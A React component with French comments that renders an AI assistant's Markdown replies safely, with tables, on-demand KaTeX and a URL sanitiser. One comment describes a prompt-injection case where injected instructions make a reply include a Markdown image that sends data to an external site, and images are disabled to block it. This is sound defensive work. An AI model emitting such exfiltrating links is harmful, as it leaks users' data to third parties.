import { useEffect, useState } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

// KaTeX chargé à la demande (voir aiMathPlugins.js) : une seule fois pour toute la session.
let mathPlugins = null;
let mathLoading = null;
function loadMath() {
    mathLoading ??= import("./aiMathPlugins").then((m) => (mathPlugins = m));
    return mathLoading;
}

// Formule probable : $…$, $$…$$, \( … \) ou \[ … \].
const MATH_HINT = /\$[^$\n]+\$|\$\$|\\\(|\\\[/;

// Rendu sûr (pas de HTML brut) des réponses de l'assistant :
// Markdown + tableaux + formules LaTeX ($...$ et $$...$$).
const components = {
    p: (props) => <p className="mb-2 last:mb-0" {...props} />,
    ul: (props) => <ul className="mb-2 list-disc space-y-1 pl-5" {...props} />,
    ol: (props) => <ol className="mb-2 list-decimal space-y-1 pl-5" {...props} />,
    h1: (props) => <h3 className="mb-2 mt-3 text-base font-bold" {...props} />,
    h2: (props) => <h3 className="mb-2 mt-3 text-base font-bold" {...props} />,
    h3: (props) => <h4 className="mb-1 mt-3 text-sm font-bold" {...props} />,
    h4: (props) => <h4 className="mb-1 mt-2 text-sm font-semibold" {...props} />,
    hr: () => <hr className="my-3 border-gray-200" />,
    blockquote: (props) => (
        <blockquote className="mb-2 border-l-4 border-gray-200 pl-3 italic" {...props} />
    ),
    code: (props) => (
        <code className="rounded bg-gray-100 px-1 py-0.5 text-[0.85em]" {...props} />
    ),
    a: (props) => <a className="text-blue-700 underline" target="_blank" rel="noreferrer noopener" {...props} />,
    table: (props) => (
        <div className="mb-2 max-w-full overflow-x-auto">
            <table className="min-w-full border-collapse text-xs sm:text-sm" {...props} />
        </div>
    ),
    th: (props) => (
        <th className="border border-gray-200 bg-gray-100 px-2 py-1 text-left font-semibold" {...props} />
    ),
    td: (props) => <td className="border border-gray-200 px-2 py-1 align-top" {...props} />,
    // Images Markdown désactivées : une réponse manipulée (injection de consignes dans le document)
    // pourrait sinon faire charger ![](https://site-externe/?donnees=…) et exfiltrer des données.
    // Seul le texte alternatif est affiché. Les images générées passent par un champ dédié (ex.image).
    img: ({ alt }) => (alt ? <span>{alt}</span> : null),
};

// Liens autorisés : http(s), mailto et adresses relatives / ancres ; tout le reste est neutralisé.
function safeUrl(url, key) {
    if (key === "src") return "";
    const value = String(url || "").trim();
    // Barres obliques inverses : « /\hote » est interprété comme « //hote » par les navigateurs.
    if (value.includes("\\")) return "";
    if (/^(https?:|mailto:)/i.test(value)) return value;
    // Relatif (« /… », « ./… », « #… », « ?… ») mais pas « //hote » (protocole implicite).
    if (/^(\/(?!\/)|\.\.?\/|#|\?)/.test(value)) return value;
    // Pas de schéma du tout (ex. « page.html ») : relatif également.
    if (value && !/^[a-z][a-z0-9+.-]*:/i.test(value) && !value.startsWith("//")) return value;
    return "";
}

export default function AiMarkdown({ children }) {
    const needsMath = MATH_HINT.test(String(children ?? ""));
    const [math, setMath] = useState(mathPlugins);

    useEffect(() => {
        if (!needsMath || math) return;
        let active = true;
        loadMath().then((m) => active && setMath(m)).catch(() => {});
        return () => {
            active = false;
        };
    }, [needsMath, math]);

    const useMath = needsMath && math;

    return (
        <div className="ai-md break-words text-sm leading-relaxed">
            <ReactMarkdown
                remarkPlugins={useMath ? [remarkGfm, math.remarkMath] : [remarkGfm]}
                rehypePlugins={useMath ? [math.rehypeKatex] : []}
                components={components}
                urlTransform={safeUrl}
            >
                {children}
            </ReactMarkdown>
        </div>
    );
}
